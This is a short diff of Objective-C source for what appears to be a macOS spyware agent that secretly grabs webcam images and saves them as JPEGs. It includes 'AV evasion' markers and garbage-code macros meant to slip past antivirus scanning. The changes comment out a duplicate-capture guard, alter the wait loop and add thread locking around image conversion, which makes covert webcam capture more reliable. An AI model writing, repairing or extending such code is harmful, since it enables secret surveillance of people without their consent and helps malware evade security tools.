@@ -72,13 +72,13 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  if (mImageGrabbed == YES)
-  {
-#ifdef DEBUG_WEBCAM
-    infoLog(@"mImageGrabbed already grabbed");
-#endif
-    return;
-  }
+//  if (mImageGrabbed == YES)
+//  {
+//#ifdef DEBUG_WEBCAM
+//    infoLog(@"mImageGrabbed already grabbed");
+//#endif
+//    return;
+//  }
   // AV evasion: only on release build
   AV_GARBAGE_002
   
@@ -137,7 +137,6 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
       
       return NO;
     }
-  
   
   // AV evasion: only on release build
   AV_GARBAGE_001
@@ -282,7 +281,7 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
       while (mImageGrabbed == NO)
         {
           BREAK_AND_FREE(nil);
-          usleep(10000);
+          [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 2.0]];
         }
       
       // AV evasion: only on release build
@@ -325,9 +324,13 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
 #ifdef DEBUG_WEBCAM
       infoLog(@"create JPEG");
 #endif
+      NSBitmapImageRep *bitmap;
       
-      NSBitmapImageRep *bitmap = [[NSBitmapImageRep alloc] 
-                                  initWithCIImage: [CIImage imageWithCVImageBuffer: mCurrentImageBuffer]];
+      @synchronized(self)
+      {
+        bitmap = [[NSBitmapImageRep alloc]
+                          initWithCIImage: [CIImage imageWithCVImageBuffer: mCurrentImageBuffer]];
+      }
       
       // AV evasion: only on release build
       AV_GARBAGE_002
